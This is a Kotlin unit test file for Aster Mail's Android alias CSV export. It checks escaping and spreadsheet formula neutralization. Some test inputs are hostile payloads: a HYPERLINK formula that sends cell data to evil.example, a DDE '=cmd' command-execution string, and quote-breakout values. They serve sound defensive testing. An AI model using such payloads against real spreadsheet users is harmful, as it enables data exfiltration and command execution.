//
// Aster Communications Inc.
//
// Copyright (c) 2026 Aster Communications Inc.
//
// This file is part of this project.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.
//

package org.astermail.android.settings

import org.astermail.android.api.ghost.GhostAlias
import org.astermail.android.api.settings.AliasDirectory
import org.astermail.android.api.settings.AliasInfo
import org.astermail.android.api.settings.CustomDomainAddressInfo
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class AliasExportTest {

    private fun alias(
        local_part: String = "shopping",
        domain: String = "astermail.org",
        display_name: String? = null,
        note: String? = null,
        websites: String? = null,
        is_enabled: Boolean = true,
        created_at: String = "2026-01-02T03:04:05Z",
        decryption_failed: Boolean = false,
    ) = AliasInfo(
        id = "alias-1",
        encrypted_local_part = local_part,
        encrypted_display_name = display_name,
        encrypted_note = note,
        encrypted_websites = websites,
        domain = domain,
        is_enabled = is_enabled,
        created_at = created_at,
        decryption_failed = decryption_failed,
    )

    @Test
    fun neutralizes_every_formula_trigger() {
        for (trigger in listOf("=", "+", "-", "@")) {
            assertEquals("'${trigger}cmd", neutralize_formula("${trigger}cmd"))
        }
    }

    @Test
    fun neutralizes_hyperlink_exfiltration_payload() {
        val payload = "=HYPERLINK(\"https://evil.example/?d=\"&A1,\"click\")"

        assertEquals("'$payload", neutralize_formula(payload))
    }

    @Test
    fun neutralizes_trigger_hidden_behind_leading_whitespace() {
        assertEquals("'   =cmd|'/c calc'!A1", neutralize_formula("   =cmd|'/c calc'!A1"))
    }

    @Test
    fun neutralizes_leading_control_characters() {
        for (lead in listOf("\t", "\r", "\n")) {
            assertEquals("'${lead}x", neutralize_formula("${lead}x"))
        }
    }

    @Test
    fun leaves_ordinary_values_untouched() {
        for (value in listOf("shopping@astermail.org", "Mr. Jarvis", "", "a=b", "  spaced")) {
            assertEquals(value, neutralize_formula(value))
        }
    }

    @Test
    fun guards_values_that_already_start_with_apostrophes() {
        assertEquals("''=1+1", neutralize_formula("'=1+1"))
        assertEquals("'''=1+1", neutralize_formula("''=1+1"))
        assertEquals("'it's fine", neutralize_formula("'it's fine"))
    }

    @Test
    fun escapes_and_doubles_quotes() {
        assertEquals("\"he said \"\"hi\"\"\"", escape_csv_cell("he said \"hi\""))
    }

    @Test
    fun quote_breakout_attempt_stays_inside_one_cell() {
        assertEquals("\"'\"\",\"\"=1+1,\"\"\"", escape_csv_cell("'\",\"=1+1,\""))
    }

    @Test
    fun csv_starts_with_bom_and_uses_crlf() {
        val csv = build_csv(listOf("address"), listOf(listOf("a@b.com")))

        assertEquals(0xFEFF.toChar(), csv[0])
        assertEquals("$UTF8_BOM\"address\"\r\n\"a@b.com\"\r\n", csv)
    }

    @Test
    fun csv_with_no_rows_still_emits_headers() {
        assertEquals(
            "$UTF8_BOM\"address\",\"enabled\"\r\n",
            build_csv(listOf("address", "enabled"), emptyList()),
        )
    }

    @Test
    fun csv_preserves_multibyte_and_rtl_text() {
        val csv = build_csv(listOf("note"), listOf(listOf("購物 مرحبا")))

        assertTrue(csv.contains("購物 مرحبا"))
    }

    @Test
    fun file_names_are_fixed_per_source() {
        assertEquals("aster-aliases-2026-07-29.csv", export_file_name(AliasExportSource.Aliases, "2026-07-29"))
        assertEquals(
            "aster-domain-addresses-2026-07-29.csv",
            export_file_name(AliasExportSource.DomainAddresses, "2026-07-29"),
        )
        assertEquals(
            "aster-directories-2026-07-29.csv",
            export_file_name(AliasExportSource.Directories, "2026-07-29"),
        )
        assertEquals(
            "aster-ghost-aliases-2026-07-29.csv",
            export_file_name(AliasExportSource.Ghost, "2026-07-29"),
        )
    }

    @Test
    fun columns_match_the_source() {
        assertEquals(ALIAS_COLUMNS, columns_for(AliasExportSource.Aliases))
        assertEquals(DOMAIN_ADDRESS_COLUMNS, columns_for(AliasExportSource.DomainAddresses))
        assertEquals(DIRECTORY_COLUMNS, columns_for(AliasExportSource.Directories))
        assertEquals(GHOST_COLUMNS, columns_for(AliasExportSource.Ghost))
    }

    @Test
    fun alias_rows_follow_requested_column_order() {
        val rows = build_alias_rows(
            listOf(alias(display_name = "Shopping", note = "Store signups", websites = "amazon.com")),
            listOf("note", "address", "display_name"),
        )

        assertEquals(
            listOf(listOf("Store signups", "shopping@astermail.org", "Shopping")),
            rows,
        )
    }

    @Test
    fun alias_rows_render_missing_optional_fields_as_empty() {
        val rows = build_alias_rows(listOf(alias()), ALIAS_COLUMNS)

        assertEquals(
            listOf(
                listOf(
                    "shopping@astermail.org",
                    "",
                    "",
                    "",
                    "true",
                    "2026-01-02T03:04:05Z",
                ),
            ),
            rows,
        )
    }

    @Test
    fun undecryptable_aliases_are_not_exportable() {
        assertFalse(is_exportable_alias(alias(decryption_failed = true)))
        assertFalse(is_exportable_alias(alias(local_part = "")))
        assertTrue(is_exportable_alias(alias()))
    }

    @Test
    fun undecryptable_domain_addresses_are_not_exportable() {
        val good = CustomDomainAddressInfo(
            id = "d1",
            domain_name = "example.com",
            encrypted_local_part = "hello",
        )

        assertTrue(is_exportable_domain_address(good))
        assertFalse(is_exportable_domain_address(good.copy(decryption_failed = true)))
        assertFalse(is_exportable_domain_address(good.copy(encrypted_local_part = "")))
    }

    @Test
    fun undecryptable_ghost_aliases_are_not_exportable() {
        val good = GhostAlias(id = "g1", domain = "astermail.org", decrypted_address = "ghost@astermail.org")

        assertTrue(is_exportable_ghost(good))
        assertFalse(is_exportable_ghost(good.copy(decryption_failed = true)))
        assertFalse(is_exportable_ghost(good.copy(decrypted_address = "")))
    }

    @Test
    fun directory_rows_never_expose_the_directory_hash() {
        val directory = AliasDirectory(
            id = "dir-1",
            directory_hash = "0123456789abcdef",
            domain = "astermail.org",
            auto_create_enabled = true,
            color = "#ff0000",
            created_at = "2026-02-03T00:00:00Z",
            decrypted_label = "shopping",
        )

        val csv = build_csv(DIRECTORY_COLUMNS, build_directory_rows(listOf(directory), DIRECTORY_COLUMNS))

        assertFalse(csv.contains("0123456789abcdef"))
        assertTrue(csv.contains("\"shopping\""))
    }

    @Test
    fun ghost_rows_render_absent_timestamps_as_empty() {
        val rows = build_ghost_rows(
            listOf(GhostAlias(id = "g1", domain = "astermail.org", decrypted_address = "ghost@astermail.org")),
            GHOST_COLUMNS,
        )

        assertEquals(listOf(listOf("ghost@astermail.org", "true", "", "")), rows)
    }

    @Test
    fun hostile_alias_survives_a_full_csv_round() {
        val csv = build_csv(
            ALIAS_COLUMNS,
            build_alias_rows(
                listOf(
                    alias(
                        display_name = "=1+1",
                        note = "\"quoted\", comma",
                        websites = "-evil.example; +other.example",
                    ),
                ),
                ALIAS_COLUMNS,
            ),
        )

        assertTrue(csv.contains("\"'=1+1\""))
        assertTrue(csv.contains("\"\"\"quoted\"\", comma\""))
        assertTrue(csv.contains("\"'-evil.example; +other.example\""))
        assertEquals(2, csv.split(CSV_LINE_BREAK).filter { it.isNotEmpty() }.size)
    }
}
